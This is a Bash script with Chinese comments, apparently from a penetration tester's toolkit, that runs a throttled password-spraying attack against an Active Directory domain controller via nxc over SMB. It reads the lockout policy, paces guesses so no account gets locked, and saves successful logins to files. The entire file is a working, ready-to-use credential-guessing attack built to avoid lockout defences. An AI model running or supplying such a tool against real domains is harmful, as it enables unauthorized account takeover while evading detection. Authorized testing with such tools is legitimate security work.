#!/usr/bin/env bash
# spray-safe.sh — 读取域口令策略后按锁定阈值安全节流的密码喷洒(防锁号)
# 用法: spray-safe.sh <域控IP> <用户名字典> [验证用户] [验证密码] [喷洒密码,默认从字典读]
# 示例: spray-safe.sh 10.10.10.10 users.txt jsmith 'Passw0rd!' 'Company@2024'
set -euo pipefail
usage() { echo "用法: $0 <域控IP> <用户名字典> [验证用户] [验证密码] [喷洒密码(缺省逐行读 passwords.txt)]"; exit 1; }
[ $# -lt 2 ] && usage
DCIP="$1"; USERLIST="$2"; VUSER="${3:-}"; VPASS="${4:-}"; SPRAY="${5:-}"
[ -f "$USERLIST" ] || { echo "用户字典不存在: $USERLIST"; exit 1; }
OUT="${PROJ_DIR:-.}"

# [1] 读取口令策略(锁定阈值/观察窗口/锁定时长)——解析 nxc --pass-pol 输出
if [ -n "$VUSER" ]; then
    POL=$(nxc smb "$DCIP" -u "$VUSER" -p "$VPASS" --pass-pol 2>/dev/null)
    # 解析失败(认证失败/nxc 输出变化)≠ 无锁定策略:宁可拒喷也不全速喷
    if [ -z "$POL" ] || ! echo "$POL" | grep -qiE 'Lockout Threshold: *[0-9]+'; then
        echo "[!] 口令策略读取失败(认证失败或 nxc 输出格式变化),锁定策略未知——拒绝喷洒"; exit 1
    fi
    LOCKOUT=$(echo "$POL" | grep -oiE 'Lockout Threshold: *[0-9]+' | grep -oE '[0-9]+')
    OBSWIN=$(echo "$POL" | grep -oiE 'Lockout Observation Window: *[0-9]+' | grep -oE '[0-9]+' || echo 0)
    LOCKDUR=$(echo "$POL" | grep -oiE 'Lockout Duration: *[0-9]+' | grep -oE '[0-9]+' || echo 0)
    echo "[策略] 锁定阈值=$LOCKOUT 观察窗=${OBSWIN}分 锁定时长=${LOCKDUR}分"
    if [ "${LOCKOUT:-0}" != "0" ] && [ "$LOCKOUT" -le 2 ]; then
        echo "[!] 阈值≤2,喷洒极其危险,建议放弃或仅单账号验证"; exit 1
    fi
else
    echo "[!] 未提供验证凭据,跳过策略读取——按保守默认:每轮后等待 35 分钟"
    LOCKOUT=5; OBSWIN=30
fi

# [2] 节流:阈值 N → 每轮每个账号只错 1 次;观察窗口+5 分钟缓冲后进下一轮
WAIT=$(( OBSWIN + 5 )); [ "$WAIT" -lt 35 ] && WAIT=35

spray_one() {  # 参数:密码
    local pw="$1" out
    out=$(nxc smb "$DCIP" -u "$USERLIST" -p "$pw" --no-bruteforce --continue-on-success 2>/dev/null)
    echo "$out" | tee -a "$OUT/spray-$(date +%H%M%S).txt" | grep -E '\[\+\]' || echo "    本轮无命中($pw)"
    echo "$out" | grep -qi 'locked' && { echo "[!!] 检测到锁定,立即停止"; exit 2; }
}

if [ -n "$SPRAY" ]; then
    echo "[喷洒] 单密码模式(每账号 1 次,安全)"; spray_one "$SPRAY"
else
    PWLIST="passwords.txt"; [ -f "$PWLIST" ] || { echo "缺 $PWLIST 且未传喷洒密码"; exit 1; }
    i=0
    while IFS= read -r pw; do
        [ -z "$pw" ] && continue; i=$((i+1))
        echo "[轮次 $i] 密码: $pw @ $(date +%H:%M:%S)"
        spray_one "$pw"
        [ "$i" -lt "$(wc -l < "$PWLIST")" ] && { echo "    等待 ${WAIT} 分钟(观察窗口)…"; sleep $((WAIT*60)); }
    done < "$PWLIST"
fi
echo "完成;命中见 $OUT/spray-*.txt;记得台账登记 ~/tools/bin/log-cred.sh"
